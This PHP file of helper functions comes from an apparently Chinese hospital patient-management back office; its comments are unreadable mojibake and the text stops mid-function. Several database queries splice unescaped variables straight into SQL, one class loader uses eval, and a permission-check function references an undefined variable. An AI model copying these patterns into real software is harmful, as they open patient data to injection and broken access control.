<?php
/*
// - ����˵�� : �����̨ ������
// - �������� : zhuwenya (zhuwenya@126.com)
// - ����ʱ�� : 2009-03-30 12:20
*/

// �����ֽ���ǿ�ƽ��л��д��� @ 2013-01-23
function wee_wrap($str, $per_len, $flag='<br>') {
	if ($per_len < 2) {
		return "***"; //Ҫ����С��2�ֽڵģ��϶����Ѷ�
	}
	$str_len = strlen($str);
	if ($str_len <= $per_len) {
		return $str;
	}

	$out = $cur = "";
	for ($i = 0; $i < $str_len; $i++) {
		$char = substr($str, $i, 1);
		if(ord($char) > 128) {
			$char .= substr($str, ++$i, 1);
		}
		if (strlen($cur) + strlen($char) > $per_len) { //��������Ժ󳬹����Ͳ�Ҫ�� ������һ��
			$out .= $cur.$flag;
			$cur = $char;
		} else if (strlen($cur) + strlen($char) == $per_len) { //���ϸպã��ͼ�
			$cur .= $char;
			$out .= $cur.$flag;
			$cur = '';
		} else {
			$cur .= $char;
		}
	}
	if ($cur != '') {
		$out .= $cur;
	}

	return $out;
}


// ��ȡpatient��������޸���־:
function patient_modify_log($new_arr, $old_arr, $log_field='') {
	global $field_to_name;

	if ($log_field == '') {
		$log_fields = array_keys($new_arr);
	} else {
		$log_fields = explode(" ", $log_field);
	}

	// �ֶζ�Ӧ��������:
	if (!isset($field_to_name) || count($field_to_name) == 0) {
		include_once dirname(__FILE__)."/patient_field_name.php";
	}

	// ��¼����Ŀ:
	$log_item = array();

	// ����Ҫ�����滻����ֹ��������ķ��ų������⣩
	$replace_from = array('"', "'", "\r", "\n");
	$replace_to = array("", "", "", " ");

	foreach ($log_fields as $f) {
		if (!empty($f) && @array_key_exists($f, $new_arr)) {
			if ((!empty($new_arr[$f]) || !empty($old_arr[$f])) && $new_arr[$f] != $old_arr[$f]) { //�����ݻ�������������һ����Ϊ��
				$str_old = str_replace($replace_from, $replace_to, strip_tags($old_arr[$f])); //ɾ�����б�ǩ/�ֺ�
				$str_old = strlen($str_old) > 50 ? cut($str_old, 50) : $str_old; //��ȡ�ʵ��ĳ���(��������Ļ�)
				$str_new = str_replace($replace_from, $replace_to, strip_tags($new_arr[$f]));
				$str_new = strlen($str_new) > 50 ? cut($str_new, 50) : $str_new;
				if ($f == "order_date") {
					$str_old = date("Y-m-d H:i", $str_old);
					$str_new = date("Y-m-d H:i", $str_new);
				}
				if ($f == "status") {
					global $status_array;
					$str_old = $status_array[$str_old];
					$str_new = $status_array[$str_new];
				}
				if ($f == "tel") {
					$str_old = tel_log_filter($str_old);
					$str_new = tel_log_filter($str_new);
				}
				$log_item[] = noe($field_to_name[$f], $f)."�ɡ�".$str_old."���޸�Ϊ��".$str_new."��";
			}
		}
	}

	if (count($log_item) > 0) {
		global $realname;
		return trim($old_arr["edit_log"]."\r\n".date("Y-m-d H:i:s")." ".$realname." ��".implode("��", $log_item)."��");
	}

	return '';
}

// ��ȡpatient��������޸���־:
function patient_modify_log_s($new_arr, $old_arr, $log_field='') {
	global $field_to_name;

	if ($log_field == '') {
		$log_fields = array_keys($new_arr);
	} else {
		$log_fields = explode(" ", $log_field);
	}

	// �ֶζ�Ӧ��������:
	if (!isset($field_to_name) || count($field_to_name) == 0) {
		include_once dirname(__FILE__)."/patient_field_name.php";
	}

	// ��¼����Ŀ:
	$log_item = array();

	// ����Ҫ�����滻����ֹ��������ķ��ų������⣩
	$replace_from = array('"', "'", "\r", "\n");
	$replace_to = array("", "", "", " ");

	foreach ($log_fields as $f) {
		if (!empty($f) && @array_key_exists($f, $new_arr)) {
			if ((!empty($new_arr[$f]) || !empty($old_arr[$f])) && $new_arr[$f] != $old_arr[$f]) { //�����ݻ�������������һ����Ϊ��
				$str_old = str_replace($replace_from, $replace_to, strip_tags($old_arr[$f])); //ɾ�����б�ǩ/�ֺ�
				$str_old = strlen($str_old) > 50 ? cut($str_old, 50) : $str_old; //��ȡ�ʵ��ĳ���(��������Ļ�)
				$str_new = str_replace($replace_from, $replace_to, strip_tags($new_arr[$f]));
				$str_new = strlen($str_new) > 50 ? cut($str_new, 50) : $str_new;
				if ($f == "order_date") {
					$str_old = date("Y-m-d H:i", $str_old);
					$str_new = date("Y-m-d H:i", $str_new);
				}
				if ($f == "status") {
					global $status_array;
					$str_old = $status_array[$str_old];
					$str_new = $status_array[$str_new];
				}
				if ($f == "tel") {
					$str_old = tel_log_filter($str_old);
					$str_new = tel_log_filter($str_new);
				}
				$log_item[] = noe($field_to_name[$f], $f)."�ɡ�".$str_old."���޸�Ϊ��".$str_new."��";
			}
		}
	}

	if (count($log_item) > 0) {
		global $realname;
		return trim($realname." ��".implode("��", $log_item)."��");
	}

	return '';
}


// ����־��¼ʱ���Ժ�������δ��� @ 2013-3-21
function tel_log_filter($mobile) {
	$len = strlen($mobile);
	if ($len == 11) {
		return substr($mobile, 0, 3)."****".substr($mobile, 7, 4);
	}
	if ($len > 4) {
		return substr($mobile, 0, -4)."****";
	}

	return $mobile;
}


function get_mobile_location($m) {
	// �ֻ����������11λ���ܲ�ѯ
	if (strlen($m) != 11) {
		return '';
	}

	global $db;

	$mo = substr($m, 0, 7);
	$tel_location = $db->query("select location from mo_location where mo='$mo' limit 1", 1, "location");

	return $tel_location;
}


// ��ȡĳ�µ�������
// month ��ʽ�� 2012-12 �������ȡ��������
function get_month_days($month = '') {
	if ($month == '') $month = date("Y-m");
	return date("j", strtotime("+1 month", strtotime($month."-1 0:0:0")) - 1);
}


function base64url_encode($data) {
  return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
  return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}


// ������ʷ��¼:
function history($num, $hightlight_id=0) {
	if (count($_SESSION["history"]) < $num) {
		$url = "?";
	} else {
		$url = $_SESSION["history"][count($_SESSION["history"]) - $num];
	}
	if ($hightlight_id > 0) {
		list($url, $tmp) = explode("#", $url, 2);
		$url .= "#".$hightlight_id;
	}
	return $url;
}

function make_td_head($tdid, $tdinfo) {
	global $aOrderFlag, $aOrderTips, $sortid, $sorttype, $defaultsort, $defaultorder, $aLinkInfo;
	$tdtitle = $tdinfo["title"];
	$tdsort = $tdinfo["sort"];
	$tddefaultorder = $tdinfo["defaultorder"];
	$new_sort = $tdid;
	if ($tdsort) {
		$tddefaultorder = max(1, $tddefaultorder);
		if ($sortid != $tdid) { // ���ǵ�ǰ������������뵱ǰ����
			$new_order = $tddefaultorder;
		} else { // �Ѿ��ڵ�ǰ����
			if ($sorttype == $tddefaultorder) { // ��Ĭ��˳������һ������:
				$new_order = $sorttype == 1 ? 2 : 1;
			} else { // ������ִ����һ������ѭ�����˳���ǰ����
				$new_sort = $new_order = 0;
			}
		}

		if ($tdid == $sortid) {
			$tip_name = $aOrderTips[$new_order];
		} else {
			$tip_name = $tdid == $defaultsort ? $aOrderTips[$defaultorder] : $aOrderTips[$tddefaultorder];
		}
		if ($sortid > 0) {
			$tdtitle .= $tdid == $sortid ? $aOrderFlag[$sorttype]  : "";
		} else {
			$tdtitle .= $tdid == $defaultsort ? $aOrderFlag[$defaultorder] : "";
		}
		$tdtitle = "<a href='".make_link_info($aLinkInfo, "page,sort,sorttype", array("page"=>1, "sort"=>$new_sort, "sorttype"=>$new_order))."' title='$tip_name'>$tdtitle</a>";
	}

	return array($tdinfo["align"], $tdinfo["width"], $tdtitle);
}

// ��ȡָ�������˵��ı��:
function get_menu_id($link_name) {
	global $db;
	$id = $db->query("select id from sys_menu where link='$link_name' limit 1", 1, "id");
	return $id;
}


// ���ǰ��Ȩ���Ƿ�����ں���
function check_power_in($check_power, $my_power) {
	$a = check_power_in_parse($check_power);
	$b = check_power_in_parse($my_power);

	// ���:
	foreach ($a[1] as $v1) {
		if (in_array($v1, $b[1])) {
			if ($a[2][$v]) {
				if (!check_power_in_power($a[2][$v], $v[2][$v])) {
					return false;
				}
			}
		} else {
			return false;
		}
	}

	return true;
}

function check_power_in_parse($s) {
	$cur_menu = $s;

	$_m3 = $_m2 = $_m1 = array();
	if (!empty($cur_menu)) {
		$_tm1 = explode(";", $cur_menu);
		foreach ($_tm1 as $s) {
			list($_sa, $_sb) = explode(":", $s);
			if ($_sa) $_m1[] = $_sa;
			if ($_sb) {
				$_tm2 = explode(",", $_sb);
				foreach ($_tm2 as $s) {
					list($_ma, $_mb) = explode("!", $s);
					if ($_ma) $_m2[] = $_ma;
					if ($_mb) $_m3[$_ma] = $_mb;
				}
			}
		}
	}

	return array($_m1, $_m2, $_m3);
}

// ���ǰ��Ȩ���Ƿ��ں���֮��(���ߵ�ͬ)
function check_power_in_power($s1, $s2) {
	if ($s1 != '' && $s2 == '') {
		return false;
	}
	if ($s1 == '') {
		return true;
	}

	$s1_len = strlen($s1);
	for ($i=0; $i<$s1_len; $i++) {
		$ch = substr($s1, $i, 1);
		if (strpos($ch, $s2) === false) {
			return false;
		}
	}

	return true;
}

function get_manage_part() {
	global $part, $uinfo;

	// ����:
	$man_part = array();
	if ($uinfo["part_admin"]) {
		$man_part = array_keys($part->get_sub_part(intval($uinfo["part_id"]), "with-self"));
	}

	// ����:
	if ($uinfo["part_manage"] != '') {
		$pids = explode(",", $uinfo["part_manage"]);
		foreach ($pids as $pid) {
			$man_part = array_merge($man_part, array_keys($part->get_sub_part($pid, 'with-self')));
		}
	}

	return implode(",", array_unique($man_part));
}

function get_sub_part($part_id, $with_self=0, $out=array()) {
	global $db, $tab;
	if ($with_self) {
		$out[] = $part_id;
	}

	$_tm = $db->query("select id from {$tab}sys_part where pid=$part_id");
	foreach ($_tm as $_li) {
		$out[] = $_li["id"];
		get_sub_part($_li["id"], 0, $out);
	}

	return $out;
}

// ��ϵͳ�д���һ��ҽԺ�ı�(������Ѵ���Ҳ������ִ���)
function create_patient_table($hospital_id_or_table_name) {
	if (!$hospital_id_or_table_name) {
		return false;
	}

	if (is_numeric($hospital_id_or_table_name)) {
		$ptable = 'patient_'.$hospital_id_or_table_name;
	} else {
		$ptable = $hospital_id_or_table_name;
	}


	$stru_q = mysql_query("SHOW CREATE TABLE `patient`");
	$stru = mysql_fetch_array($stru_q);
	$stru = $stru[1];
	$stru = str_replace("CREATE TABLE `patient`", "CREATE TABLE IF NOT EXISTS `{$ptable}`", $stru);
	$stru .= " AUTO_INCREMENT=1;";

	mysql_query($stru);

	return $ptable;
}


// ��ָ���������ϵ���ַ:
// �൱��дhost����
function sock_open($url, $ip) {
	$urls = parse_url($url);

	$address = $ip; //gethostbyname()
	$service_port = 80;

	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	if ($socket < 0) {
		echo "socket_create() failed: reason: ".socket_strerror($socket)."<br>";
	}

	$result = socket_connect($socket, $address, $service_port);
	if ($result < 0) {
		echo "socket_connect() failed.<br>Reason: ($result) ".socket_strerror($result)."<br>";
	}

	$in = "GET ".$urls["path"]."?".$urls["query"]." HTTP/1.1\r\n";
	$in .= "Host: ".$urls["host"]."\r\n";
	$in .= "Connection: Close\r\n\r\n";
	socket_write($socket, $in, strlen($in));

	$out = '';
	while ($tm = socket_read($socket, 2048)) {
		$out .= $tm;
	}

	socket_close($socket);

	return $out;
}


// ���Ƿ���ʾ?
function get_line_show($li, $pinfo) {
	$show = 1;
	if ($pinfo && in_array("close", @explode(",", $pinfo["modules"])) && $li["isshow"] != 1) {
		$show = 0;
	}
	return $show;
}


// ������ͷ:
function build_table_head($tdtitle, $tdinfo) {
	global $aOrderFlag, $aOrderTips, $sort, $sorttype, $defaultsort, $defaultorder, $link_param;
	$tdsort = $tdinfo["sort"];
	$tddefaultorder = $tdinfo["order"] ? $tdinfo["order"] : "asc";
	$new_sort = $tdtitle;
	if ($tdsort) {
		if ($sort != $tdtitle) { // ���ǵ�ǰ������������뵱ǰ����
			$new_order = $tddefaultorder;
		} else { // �Ѿ��ڵ�ǰ����
			if ($sorttype == $tddefaultorder) { // ��Ĭ��˳������һ������:
				$new_order = $sorttype == "asc" ? "desc" : "asc";
			} else { // ������ִ����һ������ѭ�����˳���ǰ����
				$new_sort = $new_order = "";
			}
		}

		if ($tdtitle == $sort) {
			$tip_name = $aOrderTips[$new_order];
		} else {
			$tip_name = $tdtitle == $defaultsort ? $aOrderTips[$defaultorder] : $aOrderTips[$tddefaultorder];
		}
		if ($sort) {
			$tdtitle .= $tdtitle == $sort ? $aOrderFlag[$sorttype]  : "";
		} else {
			$tdtitle .= $tdtitle == $defaultsort ? $aOrderFlag[$defaultorder] : "";
		}
		$tdtitle = '<a href="'.make_link_info($link_param, "page sort sorttype", array("page"=>1, "sort"=>$new_sort, "sorttype"=>$new_order)).'" title="'.$tip_name.'">'.$tdtitle.'</a>';
	}

	return array($tdinfo["align"], $tdinfo["width"], $tdtitle);
}

/*
	$link_array �ǻ������飬$not_used_var ��ʾ�ӻ���������ɾ����Щֵ
	$used_array ��ʾ���ڽ���м�����Щֵ
*/
function make_link_info($link_array, $not_used_var='', $used_array = array()) {
	$not_used_vars = array();
	if ($not_used_var) {
		$not_used_vars = explode(' ', $not_used_var);
	}

	$result = array();
	foreach ($link_array as $var_name) {
		global $$var_name;
		if ($$var_name != '' && !@in_array($var_name, $not_used_vars)) {
			$result[] = $var_name."=".urlencode((string) $$var_name);
		}
	}

	foreach ($used_array as $var_name => $var_value) {
		$result[] = $var_name."=".urlencode($var_value);
	}
	if (count($result)) {
		$result = '?'.implode("&", $result);
	} else {
		$result = '?';
	}

	return $result;
}



function check_power($op='null', $pinfo=false) {
	global $db, $power;

	if ($pinfo == false) $pinfo = $GLOBALS["pinfo"];
	if (!$power) $power = load_class("power", $db);

	return $power->check_power($op, $pinfo);
}


// ���һ��������־
function log_add($type, $title, $data='', $table='', $db=false) {
	global $db;

	$log = load_class("log", $db);
	return $log->add($type, $title, $data, $table, $db);
}


function mkdir_loop($path) {
	$path = rtrim(str_replace("\\", "/", ltrim($path)), '/');

	$p_path = dirname($path);
	if (!file_exists($p_path)) {
		mkdir_loop($p_path);
	} else {
		@chmod($p_path, 0777);
	}
	@mkdir($path, 0777);

	return true;
}


function back_url($a='', $b='', $param_add='') {
	$url = $a ? base64_decode($a) : ("/".$b);
	$url .= $param_add ? $param_add : '';
	return $url;
}

function make_back_url() {
	return base64_encode($_SERVER["REQUEST_URI"]);
}

/*
	���� class ��������һ������Ϊclass�����ƣ�ע��class�������淶������ class.������.php
	��һ������������в�������Ϊ���ʼ���������ݸ��ࡣ
	$part = load_class("part", $db);
	�൱��  include "lib/class.part.php";
		 $part = new part($db);
	�˷�ʽ����ʵ����İ�����أ�����չ��֧�����á�
*/
function load_class($class_name='') {
	if (!defined("ROOT")) {
		$root = str_replace("\\", "/", dirname(dirname(__FILE__))."/");
	} else {
		$root = ROOT;
	}
	$loaded_class = (explode(";", "".$_SESSION["loaded_class"]));
	if (!$class_name) return $loaded_class;

	$class_filename = $root."core/class.".$class_name.".php";
	if (file_exists($class_filename)) {
		include_once $class_filename;

		$eval_str = '$obj = new '.$class_name.'(';

		$args_count = func_num_args();
		for ($i=1; $i<$args_count; $i++) {
			$args[$i] = func_get_arg($i);
			$eval_str .= '$args['.$i.'], ';
		}
		$eval_str = rtrim(rtrim($eval_str), ",").");";

		eval($eval_str);

		if ($obj) {
			if (!in_array($class_name, $loaded_class)) {
				$loaded_class[] = $class_name;
			}
			$_SESSION["loaded_class"] = implode(";", $loaded_class);
		}

		return $obj;
	} else {
		exit("class $class_name not found...<br>$class_filename");
	}

	return false;
}


function make_link($s, $url='', $blank=0, $title='') {
	if ($url == '') return $s;
	return '<a href="'.$url.'"'.($blank ? ' target="_blank"' : '').($title ? (' title="'.$title.'"') : '').'>'.$s.'</a>';
}


// �Թؼ��ʣ����������ܳ�������ķ��ţ�����˫����
function safe_replace($s) {
	$s = str_replace('"', "", $s);
	$s = str_replace("'", "", $s);

	return $s;
}


function ec($string, $operation = 'DECODE', $key = '', $expiry = 0) {

	$ckey_length = 4;
	$key = md5($key ? $key : $GLOBALS['encode_key']);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}

}


function check_and_update_table($db, $table_base, $tab) {
	if (!table_exists($tab.$table_base, $db->dblink)) {
		create_table($db, $table_base, $tab);
	}
}


// ������:
function create_table($db, $table_base, $tab) {
	include_once dirname(__FILE__)."/function.create_table.php";
	if (($s = $db_tables[$table_base])) {
		$s = str_replace("{tab}", $tab, $s);
		return $db->query($s);
	}
	return false;
}


// �������ֶ��Ƿ����:
function field_exists($field, $table, $linkid=0) {
	$flist = mysql_query("show columns from ".$table, $linkid);

	$fields = array();
	while ($li = mysql_fetch_array($flist)) {
		$fields[] = $li[0];
	}

	return in_array($field, $fields);
}

// �����Ƿ����:
function table_exists($table, $linkid=0) {
	$tlist = mysql_query("show tables", $linkid);

	$tables = array();
	while ($li = mysql_fetch_array($tlist)) {
		$tables[] = $li[0];
	}

	return in_array($table, $tables);
}


// ���ز��յ�һ��ֵ:
function noe() {
	if (func_num_args() > 0) {
		for ($i=0; $i<func_num_args(); $i++) {
			$v = func_get_arg($i);
			if (!empty($v)) {
				return $v;
			}
		}
		return func_get_arg(0);
	}
	return false;
}

// ������������
// save_cache('xxx.php', array('nums'=>array(1,2), 'name'=>'weelia.zhu'));
function save_cache($filename, $data_or_array, $varname='') {
	//$filename = ROOT."cache/".$filename;
	$data = "<?php \n\n";
	foreach ($data_or_array as $k => $v) {
		$data .= '$'.$k." = ".var_export($v, true)."; \n\n";
	}
	$data .= "?>";

	$bytes = file_put_contents($filename, $data);
	return $bytes > 0 ? true : false;
}

// ���ص�ǰʱ�����ʾ:
function get_time_tip($h = -1) {
	if ($h == -1) {
		$h = date("G");
	}

	$times = array(
		array(0, 3, "ҹ����"),
		array(3, 7, "�賿��"),
		array(7, 9, "���Ϻ�"),
		array(9, 11, "�����"),
		array(11, 13, "�����"),
		array(13, 18, "�����"),
		array(18, 23, "���Ϻ�"),
		array(23, 24, "ҹ����")
	);

	foreach ($times as $li) {
		if ($h >= $li[0] && $h < $li[1]) {
			return $li[2];
		}
	}

	return '����';
}


// �ݹ��ɾ��һ��Ŀ¼:
function delete_dir($dir='') {
	if (!$dir) return false;
	$dir = rtrim($dir, "/")."/";
	if (!is_dir($dir)) return false;

	if ($dh = opendir($dir)) {
		while (($file = readdir($dh)) !== false) {
			$fullname = $dir.$file;
			$r = filetype($fullname);
			if ($r == "dir") {
				if ($file != '.' && $file != '..') {
					delete_dir($fullname);
					@unlink($fullname);
				}
			}
			if ($r == "file") {
				@chmod($fullname, 0777);
				@unlink($fullname);
			}
		}
		closedir($dh);
	}
	@unlink($dir);

	return file_exists($dir) ? false : true;
}


// ��ȡһ���������ֵ
function get_config($name, $site_id=0) {
	global $db;
	if ($site_id == 0) $site_id = CUR_SITE_ID;
	$li = $db->query("select * from site_config where name='$name' and site_id=".$site_id." limit 1", 1);
	return $li["value"] ? $li["value"] : '';
}


// ����ֵ�ǿ��ܺ����ŵȵĴ�(���纬�д�����ı�)��Ҫ�󴫵ݹ���֮ǰ��ʹ��addslashes����(post,get�Ѿ����ˣ������ݿ���ȡ������û��)
function save_config($name, $value, $site_id=0) {
	global $db;
	if ($site_id == 0) $site_id = CUR_SITE_ID;
	$time = time();
	if ($name == '') return false;
	$old_config = $db->query("select * from site_config where name='$name' and site_id=".$site_id." limit 1", 1);
	if ($old_config) {
		$config_id = $old_config["id"];
		$old_value = $old_config["value"];
		if (stripslashes($value) != $old_value) {
			$db->query("update site_config set last_value=value where id=$config_id limit 1");
			$db->query("update site_config set value='$value' where id=$config_id limit 1");
		}
		$db->query("update site_config set updatetime=$time where id=$config_id limit 1");
	} else {
		$db->query("insert into site_config set site_id=".$site_id.", name='$name', value='$value', addtime=$time, updatetime=$time");
	}

	return true;
}


// json ����(����js)
function json($array) {
	include_once dirname(__FILE__)."/class.fastjson.php";
	return FastJSON::convert($array);
}

/*
	�޼���Ŀ���������
	�����lists�����ǰ�����ĿidΪ����������
	��������Ľṹ:
	array(
		0 => array("id" => 1, "level" => 0),
		1 => array("id" => 2, "level" => 1),
		...
	);
	����:
	$class_sort = class_sort($data);
	Ȼ����� $class_sort �����Ŀid(�������)�������Ӧ��level(��Ŀ���)
	zhuwenya @ 2009-05-17 02:30
*/
/*
function class_sort($lists, $pid=0, $level=0, $array_result = array()) {
	foreach ($lists as $k => $li) {
		if ($li["class_top"] == $pid) {
			$array_result[] = array("id" => $li["id"], "level" => $level);
			unset($lists[$k]); //�ù�������ɾ��
			class_sort($lists, $li["id"], $level+1, &$array_result); //���һ��������������ַ����ʽ���ݣ������޷�����
		}
	}
	return $array_result;
}
*/



// ��ʾĳ�û��ܹ�����Ĳ����б�:
// $type:  select|array|string
// $select_part_id ѡ�е� part_id��ֻ��ǰһ�������� select ����Ч��
function get_part_list($type, $select_part_id=0) {
	global $tab, $db, $uinfo;
	$part_id = $uinfo["part_id"];
	$li = $db->query("select * from {$tab}sys_part where id='$part_id' limit 1", 1);
	$part_name = $li["name"];

	if ($type == 'select') { //����ѡ��
		$parts = '<select name="part_id" class="combo">';
		if ($li) {
			$parts .= '<option value="'.$part_id.'"'.($select_part_id == $part_id ? ' selected' : '').'>'.$part_name.($select_part_id == $part_id ? ' *' : '').'</option>';
		}
		$parts .= get_option($part_id, 1, $select_part_id);
		$parts .= '</select>';
	} else if ($type == 'array' || $type == 'string') { //������ߴ�
		global $parts;
		$parts = array();
		if ($li) {
			$parts[] = $li;
		}
		get_part_array($part_id, 1);
	}

	// ���� string ��ʽ��id��� ����: 2,3,4,7,8
	if ($type == 'string') {
		$sa = array();
		foreach ($parts as $li) {
			$sa[] = $li["id"];
		}
		$parts = implode(",", $sa);
	}

	return $parts;
}


// ��һ������option�ݹ鲿��
function get_option($parent_id, $deep, $sel_id=0) {
	global $tab, $db;
	if ($deep > 10) return ''; //��ֹ����ݹ����
	$parts = '';
	$list = $db->query("select id,name from {$tab}sys_part where pid='$parent_id'", 'id', 'name');

	if (count($list) > 0) {
		foreach ($list as $id => $name) {
			$_select = ($id == $sel_id ? ' selected' : '');
			$name .= $_select ? ' *' : '';
			$parts .= '<option value="'.$id.'"'.$_select.'>'.str_repeat('&nbsp;&nbsp;', $deep).$name.'</option>';
			$parts .= get_option($id, $deep+1, $sel_id);
		}
	}

	return $parts;
}

function get_part_array($parent_id, $deep) {
	global $tab, $db, $parts;
	if ($deep > 10) return ''; //��ֹ����ݹ����

	$list = $db->query("select * from {$tab}sys_part where pid='$parent_id'", "id");
	foreach ($list as $id => $_li) {
		$_li["ori_name"] = $_li["name"];
		$_li["name"] = str_repeat('&nbsp;&nbsp;&nbsp;&nbsp;', $deep).$_li["name"];
		$_li["level"] = $deep;
		$parts[] = $_li;
		get_part_array($id, $deep+1);
	}

	return;
}

// ѹ���ַ�:
function strim($str, $delstr, $dir='both') {
	$delstr_len = strlen($delstr);
	if ($delstr_len == 0) return $str;
	if ($dir == "both") {
		$str = strim($str, $delstr, "left");
		$str = strim($str, $delstr, "right");
	}
	if ($dir == "left") {
		$str = ltrim($str);
		while (strlen($str) > 0) {
			if (substr($str, 0, $delstr_len) == $delstr) {
				$str = ltrim(substr($str, $delstr_len));
			} else {
				break;
			}
		}
	}
	if ($dir == "right") {
		$str = rtrim($str);
		while (strlen($str) > 0) {
			if (substr($str, -($delstr_len)) == $delstr) {
				$str = rtrim(substr($str, 0, (strlen($str) - $delstr_len)));
			} else {
				break;
			}
		}
	}
	return $str;
}

function list_radio($name, $array_value, $default_value='', $split=' ') {
	$out = array();
	foreach ($array_value as $k => $v) {
		$_sel = ($k == $default_value ? ' checked="checked"' : '');
		$_style = $_sel ? ' style="font-weight:bold"' : '';
		$_id = $name."__".$k;
		$out[] = '<input type="radio" name="'.$name.'" value="'.$k.'" id="'.$_id.'"'.$_sel.'><label for="'.$_id.'"'.$_style.'>'.$v.'</label>';
	}

	return implode($split, $out);
}


// $key_field = "_key_";
// $value_field = "_value_";
function list_option($list, $key_field='_key_', $value_field='_value_', $default_value='') {
	$option = array();
	foreach ($list as $k => $li) {
		// option value=��ֵ
		if ($key_field != '') {
			if ($key_field == "_key_" || $key_field == "_value_") {
				$value = $key_field == "_key_" ? $k : $li;
			} else {
				$value = $li[$key_field];
			}
		} else {
			$value = $li;
		}

		// �Ƿ�ѡ��:
		$select = ($value == $default_value ? 'selected' : '');

		// ��ʾ����:
		if ($value_field != '') {
			if ($value_field == "_key_" || $value_field == "_value_") {
				$title = $value_field == "_key_" ? $k : $li;
			} else {
				$title = $li[$value_field];
			}
		} else {
			$title = $li;
		}
		// ���Ϊ��ǰ����ʾһ�� * ���:
		if ($select) {
			$title .= " *";
		}
		$option[] = '<option value="'.$value.'" '.$select.'>'.$title.'</option>';
	}

	return implode('', $option);
}



function face_show($content) {
	return preg_replace("/\[(\w+)\]/", '<img src="/face/${1}.gif" align="absmiddle">', $content);
}

function send_message($content, $link, $to_uid, $from_uid=0) {
	global $db;
	$time = time();
	$name1 = $db->query("select name from sys_admin where id=$to_uid limit 1", 1, "name");
	$name2 = $db->query("select name from sys_admin where id=$from_uid limit 1", 1, "name");
	$db->query("insert into sys_message set fromname='$name2', toname='$name1', content='$content', link='$link', addtime='$time'");
	return true;
}


// �����ļ�����չ������.(���)
function file_ext($filename) {
	return strpos($filename, ".") === false ? "" : strrchr($filename, ".");
}

// �����ļ��Ľ��ļ�������
function file_name($filename) {
	$filename = basename($filename);
	if (strpos($filename, ".") === false) {
		return $filename;
	} else {
		$ext = file_ext($filename);
		return basename($filename, $ext);
	}
}

function text_show($string) {
	$string = str_replace("  ", "&nbsp; ", $string);
	//$string = str_replace(" ", "&nbsp;", $string);
	$string = str_replace("\r", "", $string);
	$string = str_replace("\n", "<br>", $string);
	return $string;
}

function hftimes($string){
	if($string){
		$string = str_replace("\n", "<br>", $string);
		$tarr = explode('<br>',$string);
		return count($tarr)-1;
	}else{
		return 0;	
	}
	
}


function get_file_list($dir) {
	$count = 0;
	$files = array();
	if (is_dir($dir)) {
		if ($dh = opendir($dir)) {
			while (($file = readdir($dh)) !== false) {
				$name = $file;
				if (! in_array($file, array(".", ".."))) {
					$files[$count]["prop"] = is_dir($dir.$name) ? 1 : 2;
					$files[$count]["path"] = $dir;
					$files[$count]["name"] = $name;
					$files[$count]["size"] = filesize($dir.$name);
					$count++;
				}
			}
			closedir($dh);
		}
	}
	sort($files);
	return $files;
}

function get_dir_size($dir) {
	$size = 0;
	if (is_dir($dir)) {
		if ($dh = @opendir($dir)) {
			while (($file = readdir($dh)) !== false) {
				$name = $dir.$file;
				if (! in_array($file, array(".", ".."))) {
					if (is_dir($name)) {
						$size += get_dir_size($name."/");
					} else {
						$size += filesize($name);
					}
				}
			}
			closedir($dh);
		} else {
			return -1;
		}
	}
	return $size;
}

// �趨��ʾ��ɫ:
function set_color($title, $color) {
	return strlen(trim($color))>0 ? "<font color='$color'>$title</font>" : $title;
}

// ����ļ�����ʾ�ֽڴ�С:
function get_display_size($filename) {
	$out = "0";
	if ($filename && $nsize = @filesize($filename)) {
		$out = display_size($nsize);
	}
	return $out;
}

// ���ļ����ֽڵ�λת��Ϊ��ʾ��С:
function display_size($nsize) {
	if ($nsize / 1024 > 1) {
		$nsize = $nsize / 1024;
		if ($nsize / 1024 > 1) {
			$nsize = $nsize / 1024;
			if ($nsize / 1024 > 1) {
				$out = num_group(round($nsize / 1024, 2)) . " GB";
			} else {
				$out = num_group(round($nsize, 2)) . " MB";
			}
		} else {
			$out = num_group(round($nsize, 2)) . " KB";
		}
	} else {
		$out = num_group($nsize);
	}

	return $out;
}

// �� "123456789.12" ����Ϊ "123,456,789.12"��ֻ������������
function num_group($num, $numspergroup = 3, $splitchar = ",") {
	$out = "";
	$rightpoint = strrchr($num, ".");
	$leftint = substr($num, 0, strlen($num) - strlen($rightpoint));
	$count = 0xff;
	$now = "";
	$nlen = strlen($leftint);
	for ($ni=0; $ni<$nlen; $ni++) {
		$now = substr($num, $nlen-$ni-1, 1) . $now;
		if (strlen($now) == $numspergroup || $ni == ($nlen - 1)) {
			$anum[$count--] = $now;
			$now = "";
		}
	}
	ksort($anum);

	return implode($splitchar, $anum) . $rightpoint;
}

// ȥ���ı��е�html����:
function format_text($string) {
	$search = array("'<script[^>]*?>.*?</script>'si", "'<[\/\!]*?[^<>]*?>'si", "'([\r\n])[\s]+'", "'&(quot|#34);'i",
